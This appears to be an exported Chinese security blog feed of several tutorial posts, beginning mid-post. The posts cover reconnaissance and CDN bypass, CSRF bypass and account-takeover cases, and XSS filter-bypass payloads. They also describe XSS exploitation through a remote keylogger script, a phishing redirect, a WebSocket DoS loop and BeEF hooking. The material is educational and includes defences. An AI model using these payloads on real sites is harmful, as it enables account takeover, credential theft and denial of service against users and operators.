title="指纹识别"></a>指纹识别</h2><p>&#8195;1.在线网站识别</p><p>&#8195;<code>http://www.yunsee.cn/</code></p><p>&#8195;2.浏览器插件<code>Wappalyzer</code></p><p> <img src="/images/wappalzer.png" alt="wappalzer"></p><h2 id="Google-Dork"><a href="#Google-Dork" class="headerlink" title="Google Dork"></a>Google Dork</h2><p><code>https://github.com/nerrorsec/GoogleDorker</code></p><p>&#8195;这款工具会根据你输入的域名生成规则，并以域名为html文件名生成一个页面，下载到本地访问后</p><p><img src="/images/googledork.png" alt="googledork"></p><h2 id="web目录"><a href="#web目录" class="headerlink" title="web目录"></a>web目录</h2><p>&#8195;1.kali linux里自带的<code>dirb、dirbuster、wfuzz</code></p><p>&#8195;2.<code>dirsearch</code> <code>https://github.com/maurosoria/dirsearch</code></p><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>&#8195;这个字典里啥都有，挺好用的：<code>https://github.com/danielmiessler/SecLists?source=post_page-----ec25f7f12e6d----------------------</code></p><h2 id="绕CDN"><a href="#绕CDN" class="headerlink" title="绕CDN"></a>绕CDN</h2><p>&#8195;1.验证CDN的存在</p><p>&#8195;&#8195;首先我们先确定网站是否存在CDN，使用在线网站<code>https://www.17ce.com/site/index</code>当你发现解析ip不一样，那么就是存在CDN。</p><p><img src="/images/ping.png" alt="ping"></p><p>&#8195;2.绕过CDN获取真实ip</p><p>&#8195;&#8195;还是使用刚才内个在线网站，挨个去访问我们收集到的子域名，总会有那么几个站是没有cdn的。</p><p>&#8195;&#8195;在注册网站的时候，网站会给我们发邮箱，可通过检查电子邮件原文查找Received字段获取服务器的真实ip</p><p><img src="/images/qq.png" alt="qq"></p><p><img src="/images/qq1.png" alt="qq1"></p><p>&#8195;&#8195;然后就出现下面这个页面</p><p><img src="/images/qq2.png" alt="qq2"></p><p>&#8195;&#8195;使用工具<code>https://github.com/m0rtem/CloudFail、https://github.com/vincentcox/bypass-firewalls-by-DNS-history、https://github.com/Ridter/get_ip_by_ico</code></p><p>&#8195;&#8195;DNS历史解析记录可能会有真实ip<code>https://dnsdb.io/zh-cn/、https://x.threatbook.cn/</code></p><p>&#8195;&#8195;SSL证书探测，可以在<code>https://censys.io/certificates</code>这个网站上输入<code>443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:www.baidu.com</code>来查找</p><p><img src="/images/censys1.png" alt="censys1"></p><p>&#8195;&#8195;通过查看历史解析记录可能会查找到真实ip<code>https://toolbar.netcraft.com/site_report?url=</code></p><p>&#8195;&#8195;还有一种方法就是通过一个网站<code>FOFA.so</code>这个真的是好用的不行，我们通过查看网页源代码找到一些特有的关键词，然后在<code>fofa</code>里搜索，语法为<code>title=&quot;关键词&quot;</code>，然后你就会看到下图这个样子，还可以根据网站的出现时间，地点，web中间件等来匹配，这样会更精准。</p><p><img src="/images/fofa.png" alt="fofa"></p><h2 id="C段扫描"><a href="#C段扫描" class="headerlink" title="C段扫描"></a>C段扫描</h2><p>&#8195;在我们获取到他真实ip后，我们就可以进行c段扫描了</p><p>&#8195;首先先探测主机存活<code>nmap -sn -PE -n ip/24</code></p><p>&#8195;获取到存活ip后进行全端口的扫描<code>nmap -sS -Pn -p 1-65535 -n ip</code></p><p>&#8195;为什么这样做我应该就不用说了，我相信你们懂</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>&#8195;目前感觉有OneForAll这款工具就够用了，但还是写一款自己用的自动化脚本用起来会比较顺手，so，但愿自己能在年前把这个脚本写出来</p>]]></content>
      
      
      <categories>
          
          <category> recon </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF_bypass和案例</title>
      <link href="/2019/12/05/CSRF_2/"/>
      <url>/2019/12/05/CSRF_2/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=29713635&auto=0&height=66"></iframe><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>1.<strong>使用其他人的CSRF令牌</strong></p><p>&#8195;当应用程序不验证csrf令牌是否绑定到这个账户时，可以自己尝试去验证这一点：首先用账户a登录到网站，转到密码更改页面，使用burp抓取csrf令牌。使用账户B登录网站，并修改账户B的密码，在修改时抓包修改csrf令牌，如果成功就证明可以使用他人的csrf令牌。</p><p>2.<strong>替换相同长度的值</strong></p><p>&#8195;首先我们先确定令牌的长度，例如长度为21个字符，令牌为<code>ud019eh10923213213123</code>,我们可以替换为具有相同值的令牌<code>ud019eh10832121321223</code></p><p>3.<strong>删除CSRF令牌</strong></p><p>&#8195;尝试进行敏感操作的时候把令牌删掉，看看是否可以操作成功。</p><p>5.<strong>使用令牌固定部分</strong></p><p>&#8195;对比两个csrf令牌，相同部分为固定的，反之为动态部分，通常情况下只要固定部分为正确的就可以使用这个令牌</p><p>6.<strong>改变请求方式</strong></p><p>&#8195;例如我们在修改密码的时候是Get请求，那么我们在伪造请求的时候，就通过Post的方式发送。</p><p>7.<strong>绕Referer</strong></p><p>&#8195;web应用程序有的时候会验证referer，例如目标网站叫<code>www.abc.com</code>，我们就可以创建一个目录叫<code>www.abc.com</code>，这样的话就有可能绕过验证</p><p>&#8195;也可以尝试删除referer</p><p>8.<strong>xss+csrf</strong></p><p>&#8195;利用xss去获取令牌，然后进行csrf攻击</p><p>9.<strong>CLRF+CSRF</strong></p><p>&#8195;利用CLRF漏洞去固定cookie，然后进行csrf攻击</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>1.<strong>通过两个漏洞进行账户接管</strong></p><p>&#8195;现在假设uri为<code>example.com</code>,我们在这个网站上发现可以添加电子邮箱，可利用此邮箱接收重置密码链接。现在我们尝试添加邮箱时删除csrf令牌，看是否可以添加成功，果然，尽管没有csrf令牌，也是可以添加成功的，现在我们就可以构造payload，当用户访问，就可以更改邮箱了，但是我们发现，在成功修改后会提示修改成功，这样我们就暴露了，经过一番研究后发现，当我们修改邮箱时，uri为：<code>https://www.example.com/account/addEmail?email_ref=A3Ig_klkdfnw&amp;st=2E67C2F5B0AF8DE90&amp;redirect_url=email_settings</code>当我们把参数<code>redirect_url=email_settings</code>更改为<code>redirect_url=home</code>后，添加完邮箱就会跳转到主页，这样我们就不会暴露了，所以我们只需要把这两个漏洞结合在一起就可以完成一次完美的攻击了</p><p>2.<strong>csrf导致的账户接管</strong></p><p>&#8195;此csrf漏洞是在绑定电子邮箱和账户名处，从而导致账户接管，作者发现在修改邮箱时会验证csrf令牌，如果删除就会失败，当他把这个post请求改为get请求后，就能成功绕过，这样的话只要任意用户访问我们的恶意链接，我们就可以修改他的邮箱，和用户名，这看起来很简单，但是他获得了2400美金</p><p>3.<strong>XSS与CSRf的利用，导致账户接管</strong></p><p>&#8195;首先是发现了一个<code>self-xss</code>，然后发现修改密码处需要csrf令牌，作者通过self-xss窃取csrf令牌，并同时写入到csrf payload 页面，并跳转过去，这样的话就可以成功的修改密码</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>&#8195;本来打算在后面写个jsonp劫持和cors劫持，但是我现在打算用接下来3天的时间写一个recon脚本，打算设计两种功能，一、快速获取子域名，二、可能会很慢但是会比较全的收集子域名，我也不知道我这3天能否完成，但是我想试试</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><code>http://infosecflash.com/2019/01/05/how-i-could-have-taken-over-any-pinterest-account/</code></p><p><code>https://shahmeeramir.com/methods-to-bypass-csrf-protection-on-a-web-application-3198093f6599</code></p><p><code>https://medium.com/swlh/bypassing-csrf-protection-c9b217175ee</code></p><p><code>https://medium.com/@sherazkhalid_60362/account-takeover-by-chaining-two-vulnerabilities-bb447753b089</code></p><p><code>https://nirmaldahal.com.np/r-xss-csrf-bypass-to-account-takeover/?__cf_chl_jschl_tk__=e0ddfe35f9fb4ef32043413ca483e9b149455471-1575553647-0-AeSewmjyKNq9ZRBYRR5iIan4ybMNYpiYyWMVRIl8YVutVTQTrcu1YKrPp8HPfMHGgTGxokpcwpijA1sUjUCpWaw_ibLemtVW338Gre0CyqBEEUlCbhQsVLA3DkwVeqtQTSoOu25DWzVNWKdhPbrnV5P6XHuDncrcwYlcW5C-c1Hz6Xv_nyyUcyGtDKqKhxwinGRSOt9de8YC3DRIgCu5NUEulQ18Q06qxXDgO-lQjDArIRNLoOreXoEJUiUdyVGnLPSzfJL7F4dj8yzzqLYj5FzKh-YUdlfXtV-B3_kNiM79g7nOZ6Y9TFD3EmCJtyVyLw</code></p>]]></content>
      
      
      <categories>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF_1</title>
      <link href="/2019/12/05/CSRF_1/"/>
      <url>/2019/12/05/CSRF_1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1301909440&auto=0&height=66"></iframe><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&#8195;当web应用没有对用户的一些敏感操作（修改密码，添加用户等）进行二次验证，导致攻击者可以构造恶意文件或链接，当用户在存在漏洞网站的认证<code>身份信息没有失效时</code>，访问了恶意链接，就会在受害者不执行的情况下，以受害者的身份向服务器发送请求，完成一些非法操作的攻击行为。</p><p>&#8195;没明白的小伙伴请看下面的图解</p><p><img src="/images/csrf.png" alt="csrf"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>&#8195;1.<strong>修改密码</strong></p><p>&#8195;&#8195;当我们在修改密码的时候，发现url中存在我们输入的密码（有的时候是post传输的，所有需要抓包观察）</p><p><img src="/images/csrfmi.png" alt="csrf"></p><p>&#8195;&#8195;我们尝试修改一下url中密码</p><p><img src="/images/csrfmi1.png" alt="csrf"></p><p>&#8195;&#8195;访问后发现提示密码修改了</p><p><img src="/images/csrfmi2.png" alt="csrfmi2"></p><p>&#8195;&#8195;我们可以创建一个1.html文件</p><p><img src="/images/csrfmi3.png" alt="csrfmi2"></p><p>&#8195;&#8195;当用户访问到该页面就会被修改密码，他还不知道！！</p><p>&#8195;2.<strong>添加管理员</strong></p><p>&#8195;&#8195;espcmsv5版本后台有个添加管理员</p><p><img src="/images/csrft.png" alt="csrfmi2"></p><p>&#8195;&#8195;我尝试添加一个用户，并抓包分析，发现是通过post传输的，所以我们需要构建一个表单来完成此次攻击</p><p><img src="/images/csrft1.png" alt="csrfmi2"></p><p>&#8195;&#8195;我们来创建一个esp1.html</p><p><img src="/images/csrft2.png" alt="csrfmi2"></p><p>&#8195;&#8195;当管理员访问后，就会成功添加管理员用户</p><p><img src="/images/csrft3.png" alt="csrfmi2"></p><p><code>其实不光这两种利用方式，像添加文件啊，转账啊，凡事用户的敏感操作没有进行二次验证的都有可能受到攻击</code></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>&#8195;验证referer字段</p><p>&#8195;添加一次性且随机的token</p>]]></content>
      
      
      <categories>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS_案例</title>
      <link href="/2019/12/03/XSS_2/"/>
      <url>/2019/12/03/XSS_2/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1312925425&auto=0&height=66"></iframe><h3 id="文件上传XSS"><a href="#文件上传XSS" class="headerlink" title="文件上传XSS"></a>文件上传XSS</h3><p>1.上传html文件</p><p>&#8195;文件内容为xss的payload</p><p>&#8195;<code>&lt;svg/onload=alert(1)&gt;</code></p><p>&#8195;上传成功后去访问就会触发</p><p>2.上传svg文件</p><p>&#8195;svg文件内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;</span><br><span class="line">    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p>&#8195;同样只要能访问到就可以触发</p><h2 id="案例分享"><a href="#案例分享" class="headerlink" title="案例分享"></a>案例分享</h2><p>1.一个有在线聊天的网站，发送的聊天内容为xss payload</p><p><img src="/images/xsschat.png" alt="xsschat"></p><p><img src="/images/xsschat2.png" alt="xsschat"></p><p>2.绕过XSS filter</p><p>&#8195;当输入简单的payload:</p><p>&#8195;<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>&#8195;发现请求被WAF阻止，经过各种尝试发现，当输入：</p><p>&#8195;<code>o&lt;x&gt;nmouseover=alert&lt;x&gt;1//</code></p><p>&#8195;尖括号与之间的内容被删除，仅剩下<code>onmouseover=alert(1)//</code>并弹出一个xss</p><p>&#8195;这个案例的话就是测试一下waf会对我们输入的内容怎么处理，根据处理方式进行一种利用，进而绕过，当我们遇到一个xss点，一定要多尝试，不要输入俩payload就觉得服务器已经防的死死的，多尝试，多研究，终会绕过的。</p><p>3.错误页面反应的XSS</p><p>&#8195;假设我们现在访问了一段url</p><p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=../../../../etc/passwd</code></p><p>&#8195;出现了以下错误页面</p><p><img src="/images/xssbc.png" alt="xssbc"></p><p>&#8195;我们可以发现，url中file=后面的内容在页面中显示了出来</p><p>&#8195;我们接着尝试插入html标记，测试一下有没有filter</p><p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=&lt;h1&gt;asu</code></p><p><img src="/images/xssbc2.png" alt="xssbc"></p><p>&#8195;很显然，并没有filter,我们只需插入xss payload就可以了</p><p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=&lt;img src=x onmouseover=alert(1)&gt;</code></p><p><img src="/images/xssbc3.png" alt="xssbc"></p><p>4.url的xss与google dork的故事</p><p>&#8195;假设目标网站是<code>www.example.com</code>，我们使用google <code>site:*.example.com inurl:redirect</code></p><p>&#8195;当我们找到名为<code>example.com/social?redirect=/somewhere</code>时可以尝试<code>Open redirect</code>或XSS</p><p>&#8195;当重定向到白名单url成功后，就可以尝试xss：<code>example.com/social?redirect=javascript://alert(1)</code>,访问后可能会重定向别的地方，按正常用户流程走，可能会触发xss</p><p>&#8195;这个案例就是说我们拿到一个网站后，用google dork一下，发现open redirect 的点后，就在redirect后面添加</p><p>&#8195;简单的javascript urI：<code>javascript://alert(1)</code>去尝试一下。</p><p>5.绕过filter</p><p>&#8195;当网站把<code>&quot;&quot;</code>过滤为<code>&quot;</code>,把<code>&gt;</code>过滤为<code>&amp;gt</code>，我们的payload中就不能使用符号<code>&quot; &lt; &gt;</code></p><p>&#8195;我们就得一点点尝试，然后看<code>response</code>什么样，根据响应结果来修改payload</p><p>&#8195;当payload:时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a=&apos;)&#125;hello&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/xssf.png" alt="xssf"></p><p>&#8195;当payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a=1′)&#125;%0Aelse&#123;%0Aalert(‘XSS’);</span><br></pre></td></tr></table></figure><p><img src="/images/xssf1.png" alt="xssf"></p><p>&#8195;这里没有触发是因为<code>&#39;)</code>未闭合，所有我们再修改一下payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a= 1′)&#125;%0Aelse&#123;%0Aalert(‘XSS’);(‘</span><br></pre></td></tr></table></figure><p><img src="/images/xssf2.png" alt="xssf"></p><p><img src="/images/xssf3.png" alt="xssf"></p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>还是内句话，遇到waf要多尝试，1小时不行就2小时，2小时不行就3小时，不要随便试试就放弃</p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>资源收集</title>
      <link href="/2019/12/03/%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/"/>
      <url>/2019/12/03/%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="此贴不定时更新一些有用的小脚本小工具好网站"><a href="#此贴不定时更新一些有用的小脚本小工具好网站" class="headerlink" title="此贴不定时更新一些有用的小脚本小工具好网站"></a>此贴不定时更新一些有用的小脚本小工具好网站</h1><p><code>https://github.com/gwen001/pentest-tools/blob/master/dnsexpire.py</code> 此脚本可检测域名到期时间，可利用此脚本检测子域名接管。</p><p><code>https://www.giftofspeed.com/cache-checker/</code></p>]]></content>
      
      
      <categories>
          
          <category> 脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS bypass</title>
      <link href="/2019/12/02/XSS%20bypass/"/>
      <url>/2019/12/02/XSS%20bypass/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=27890306&auto=0&height=66"></iframe><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>&#8195;1.hex编码</p><p><img src="/images/xssbp.png" alt></p><p>&#8195;2.大小写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;  ————》 &lt;sCriPt&gt;AlERt(1)&lt;/sCriPt&gt;</span><br></pre></td></tr></table></figure><p>&#8195;3.空格回车Tab</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(1)&quot; width=100&gt;</span><br></pre></td></tr></table></figure><p>&#8195;4.拆分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas</span><br><span class="line">cript:</span><br><span class="line">alert(1)&quot; width=100&gt;</span><br></pre></td></tr></table></figure><p>&#8195;5.Unicode编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert进行Unicode编码后\u0061\u006c\u0065\u0072\u0074</span><br><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;6.不使用括号</p><p>有的时候我们的（）会被过滤掉，那么我们就可以用throw来绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;  //这个在chrome里会出现一个uncaught错误，我们可以使用一下payload</span><br><span class="line">&lt;body/onload=javascript:window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&gt;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;7.不使用&lt;&gt;</p><p>当输入点在input便签里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=&quot;XSStest&quot; type=text&gt;</span><br><span class="line">可以尝试</span><br><span class="line">&quot; autofocus onfocus=alert(1)//</span><br></pre></td></tr></table></figure><p>bypass的方式有很多，我就不一一列举了，可以尝试使用下面的payload去fuzz一下</p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p><a href="https://github.com/payloadbox/xss-payload-list" target="_blank" rel="noopener">https://github.com/payloadbox/xss-payload-list</a></p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS_利用</title>
      <link href="/2019/11/25/XSS_1/"/>
      <url>/2019/11/25/XSS_1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1300527847&auto=0&height=66"></iframe><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&#8195;简单的来说就是web应用对用户的输入过滤不足，导致攻击者插入恶意的脚本代码</p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p><img src="/images/xsslc.jpg" alt></p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>&#8195;反射型</p><p>&#8195;&#8195;这种类型可以说是一次性的，需要用户去点击攻击者篡改后的链接，才会触发</p><p>&#8195;存储型</p><p>&#8195;&#8195;这种类型的话，恶意代码会被存储的网站数据库中，知道用户去访问就会触发</p><p>&#8195;DOM型</p><p>&#8195;&#8195;这是一种特殊类型的反射型xss，基于DOM文档对象模型的一种漏洞</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>&#8195;1.盗取cookie</p><p>&#8195;2.网页钓鱼</p><p>&#8195;&#8195;可使用setookit这个工具克隆网站，然后插入payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;windows.location=&quot;http://uip/&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;&#8195;当用户访问到存在漏洞的页面，就会跳转到你克隆的页面，输入的内容会在服务器上显示</p><p>&#8195;3.键盘记录</p><p>&#8195;&#8195;在咱们自己的服务器网站根目录下创建Keylogger.js文件</p><p><img src="/images/keylogger.png" alt="keylogger"></p><p>&#8195;&#8195;再创建keylogger.php文件，并保存在同一个目录下。</p><p><img src="/images/keyloggerphp.png" alt="keyloggerphp"></p><p>&#8195;&#8195;接着创建一个空的keylog.txt文件，并赋予其相应的可写权限。</p><p>&#8195;&#8195;在存在漏洞的网站插入payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://uip/Keylogger.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;4.DOS攻击</p><p>&#8195;如果你发现存储型的xss，并把这段恶意代码插入到目标网站，只要有用户访问到这个点，就会主动去请求连接要攻击的ip地址，站小流量小的话没啥危害，要是内种流量很大的网站，对目标ip会有很大的危害。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript”&gt;</span><br><span class="line"></span><br><span class="line">while (true)&#123; </span><br><span class="line"></span><br><span class="line">var ws = new WebSocket(&quot;ws://要攻击的IP地址:端口”);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;5.利用beef软件进行攻击</p><p>&#8195;&#8195;首先我们开启beef，第一个标红处的代码需要你把他插入的目标网站，第二段标红处需要你自己访问</p><p><img src="/images/xssbeef.png" alt="xssbeef"></p><p>&#8195;当有人访问了存在xss的页面后，我们的beef就会显示出来</p><p><img src="/images/xssbeef1.png" alt="xssbeef"></p><p>&#8195;这个<code>logs</code>里记录的是用户鼠标键盘的一些操作：</p><p><img src="/images/xssbeef2.png" alt="xssbeef"></p><p>&#8195;这个<code>Current Browser ——&gt; Details</code> 里记录的是对方的操作系统、浏览器版本、cookie等信息</p><p><img src="/images/xssbeef3.png" alt="xssbeef"></p><p>&#8195;这个<code>Current Browser ——&gt; Commands</code>里是可以发送命令给主机，英文看不懂的自行翻译</p><p><img src="/images/xssbeef4.png" alt="xssbeef"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>&#8195;开启HttpOnly</p><p>&#8195;输入过滤 输出编码</p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
